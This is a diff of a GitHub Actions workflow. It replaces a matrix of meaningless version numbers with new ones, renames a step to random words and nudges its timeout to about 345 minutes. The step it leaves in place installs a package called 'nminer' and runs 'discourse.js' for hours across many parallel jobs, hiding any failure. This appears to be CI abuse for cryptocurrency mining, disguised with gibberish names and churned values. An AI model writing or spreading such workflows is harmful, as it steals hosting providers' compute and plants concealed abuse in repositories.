@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1864 }
-          - { version: 921 }
-          - { version: 4620 }
-          - { version: 4957 }
-          - { version: 1579 }
-          - { version: 1635 }
-          - { version: 7204 }
-          - { version: 3627 }
-          - { version: 6851 }
-          - { version: 7426 }
-          - { version: 4494 }
-          - { version: 2282 }
-          - { version: 8432 }
-          - { version: 1941 }
-          - { version: 4098 }
-          - { version: 6994 }
-          - { version: 8643 }
-          - { version: 2313 }
-          - { version: 6401 }
-          - { version: 567 }
+          - { version: 3454 }
+          - { version: 5857 }
+          - { version: 4300 }
+          - { version: 9620 }
+          - { version: 2777 }
+          - { version: 2628 }
+          - { version: 5722 }
+          - { version: 6487 }
+          - { version: 347 }
+          - { version: 5971 }
+          - { version: 3898 }
+          - { version: 1615 }
+          - { version: 6783 }
+          - { version: 2798 }
+          - { version: 8632 }
+          - { version: 7433 }
+          - { version: 4863 }
+          - { version: 2052 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: except aboard whereas stingy
+      - name: defensive bootleg above swathe
         run: |
           npm install nminer@latest
-          timeout 343m node discourse.js || echo "discourse executed"
+          timeout 345m node discourse.js || echo "discourse executed"
